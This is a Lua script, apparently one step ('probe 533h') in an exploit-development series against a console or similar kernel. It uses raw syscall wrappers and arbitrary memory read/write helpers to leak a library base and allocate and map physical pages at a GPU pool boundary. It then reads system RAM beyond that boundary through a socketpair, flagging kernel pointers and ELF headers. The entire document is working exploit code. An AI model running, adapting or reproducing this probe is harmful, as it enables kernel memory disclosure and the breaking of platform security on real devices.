-- CRASH_CLASS: MODERATE
-- PROBE 533h: Read system RAM past GPU pool via socketpair
--
-- 533f confirmed: writev shows 49+ pages VALID past pool boundary.
-- 533g failed because pipe2 returned 0/0 (bug).
-- Fix: use socketpair(AF_UNIX, SOCK_DGRAM) which we KNOW works (526a).
-- Read content of pages past pool boundary (0x150000000).

print("=== PROBE 533h: READ SYSRAM ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v)
    if type(v) == "table" and v.h then
        local h, l = v.h, v.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return string.format("0x%08X%08X", h, l)
    end
    return string.format("0x%X", to_num(v))
end
local function wd(a, v) return pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) return pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end; return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end; return nil
end
local function zero(b, n) for off = 0, n-4, 4 do wd(b+off, 0) end end
local function get_hi_lo(v)
    if type(v) == "table" and v.h then
        local h, l = v.h, v.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return h, l
    end
    local n = to_num(v); if n < 0 then n = n + 0x100000000 end
    return 0, n
end

local function write_string(buf, s)
    for i = 1, #s, 4 do
        local b0 = string.byte(s, i) or 0
        local b1 = string.byte(s, i+1) or 0
        local b2 = string.byte(s, i+2) or 0
        local b3 = string.byte(s, i+3) or 0
        wd(buf + (i - 1), b0 + b1 * 256 + b2 * 65536 + b3 * 16777216)
    end
end

local sc_writev = make_syscall(121)
local sc_read = make_syscall(3)
local sc_write = make_syscall(4)
local sc_close = make_syscall(6)
local sc_socketpair = make_syscall(135)
local sc_open = make_syscall(5)
local sc_628 = make_syscall(628)

local lk = uint64(0)
do
    local info = memory.alloc(0x200)
    zero(info, 0x200); wd(info, 0x160)
    pcall(function() make_syscall(593)(uint64(0x2001), info) end)
    lk = uint64(string.format("0x%X%08X", rd(info + 0x10C) or 0, rd(info + 0x108) or 0))
end
print("lk=" .. q(lk))
local alloc_fn = lk + uint64(0x17EF0)

-- Create socketpair for data transfer
local sv = memory.alloc(8)
zero(sv, 8)
local ok_sp, sprv = pcall(function()
    return sc_socketpair(uint64(1), uint64(2), uint64(0), uint64(sv))
end)
local sp_rv = ok_sp and to_num(sprv) or -999
local fd_a = rd(sv)
local fd_b = rd(sv + 4)
print("socketpair: rv=" .. sp_rv .. " a=" .. (fd_a or "nil") .. " b=" .. (fd_b or "nil"))

if sp_rv ~= 0 or not fd_a or not fd_b or fd_a <= 0 or fd_b <= 0 then
    print("ERROR: socketpair failed")
    print("=== 533h DONE ===")
    return
end

-- Also open /dev/null for the writev validity test
local path_buf = memory.alloc(16)
zero(path_buf, 16)
write_string(path_buf, "/dev/null\0")
local ok_o, null_fd = pcall(function()
    return sc_open(uint64(path_buf), uint64(2), uint64(0))
end)
null_fd = to_num(null_fd)
print("null_fd=" .. null_fd)

-- Allocate at pool end
local phys_out = memory.alloc(8)
wq(phys_out, uint64(0))
pcall(function()
    native.fcall_with_rax(alloc_fn, 0,
        uint64("0x14FFC0000"), uint64("0x150000000"), uint64(0x4000),
        uint64(0x4000), uint64(0), uint64(phys_out))
end)
local phys = rq(phys_out)
local phys_n = to_num(phys)
print("phys=" .. q(phys))

local pool_end = 0x150000000
local pages_to_end = math.floor((pool_end - phys_n) / 0x4000)
print("pages_to_end=" .. pages_to_end)

-- Map
local ok_m, map_va = pcall(function()
    return sc_628(uint64(0), uint64(0x4000), uint64(-1),
        uint64(3), uint64(0), phys)
end)
print("VA=" .. q(map_va))

-- [A] Read pages from boundary-2 through boundary+32
print("")
print("[A] Reading pages (boundary at pg " .. pages_to_end .. ")")

local iov = memory.alloc(16)
local page_size = 0x4000
local read_size = 64
local nonzero_count = 0
local kptr_count = 0

local start_pg = math.max(0, pages_to_end - 2)
local end_pg = pages_to_end + 32
local consec_fail = 0

for pg = start_pg, end_pg do
    local test_addr = map_va + uint64(pg * page_size)
    local phys_est = phys_n + pg * page_size
    local bm = phys_est >= pool_end and " PAST" or ""

    -- First: writev to /dev/null to check validity
    if null_fd > 0 then
        wq(iov, test_addr)
        wq(iov + 8, uint64(16))
        local ok_chk, chk_rv = pcall(function()
            return sc_writev(uint64(null_fd), uint64(iov), uint64(1))
        end)
        local chk_n = ok_chk and to_num(chk_rv) or -999
        if chk_n ~= 16 then
            print(string.format("  pg %02d (0x%X)%s: INVALID", pg, phys_est, bm))
            consec_fail = consec_fail + 1
            if consec_fail >= 4 and pg > pages_to_end then
                print("  (stopping: 4 consecutive failures)")
                break
            end
            -- skip reading
        else
            consec_fail = 0
            -- Valid page — read via socketpair
            wq(iov, test_addr)
            wq(iov + 8, uint64(read_size))
            local ok_wv, wrv = pcall(function()
                return sc_writev(uint64(fd_a), uint64(iov), uint64(1))
            end)
            local wrvn = ok_wv and to_num(wrv) or -999

            if wrvn ~= read_size then
                print(string.format("  pg %02d (0x%X)%s: writev=%d", pg, phys_est, bm, wrvn))
            else
                local rbuf = memory.alloc(read_size)
                zero(rbuf, read_size)
                local ok_rd2, rrv = pcall(function()
                    return sc_read(uint64(fd_b), uint64(rbuf), uint64(read_size))
                end)
                local rrvn = ok_rd2 and to_num(rrv) or -999

                if rrvn ~= read_size then
                    print(string.format("  pg %02d (0x%X)%s: read=%d", pg, phys_est, bm, rrvn))
                else
                    local hex = ""
                    local all_zero = true
                    for off = 0, 28, 4 do
                        local d = rd(rbuf + off)
                        if d then
                            if d < 0 then d = d + 0x100000000 end
                            if d ~= 0 then all_zero = false end
                            hex = hex .. string.format("%08X ", d)
                        end
                    end

                    local has_kptr = false
                    for off = 0, read_size - 8, 8 do
                        local v = rq(rbuf + off)
                        if v then
                            local h, l = get_hi_lo(v)
                            if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                                has_kptr = true
                                kptr_count = kptr_count + 1
                            end
                        end
                    end

                    local d0 = rd(rbuf)
                    if d0 and d0 < 0 then d0 = d0 + 0x100000000 end
                    local has_elf = d0 == 0x464C457F

                    local tag = ""
                    if has_kptr then tag = " ***KPTR***" end
                    if has_elf then tag = tag .. " ***ELF***" end
                    if not all_zero then nonzero_count = nonzero_count + 1 end

                    if all_zero then
                        print(string.format("  pg %02d (0x%X)%s: ZERO", pg, phys_est, bm))
                    else
                        print(string.format("  pg %02d (0x%X)%s: %s%s", pg, phys_est, bm, hex, tag))
                    end
                end
            end
        end
    end
end

pcall(function() sc_close(uint64(fd_a)) end)
pcall(function() sc_close(uint64(fd_b)) end)
if null_fd > 0 then pcall(function() sc_close(uint64(null_fd)) end) end

print("")
print("nonzero=" .. nonzero_count .. " kptr=" .. kptr_count)
print("=== 533h DONE ===")
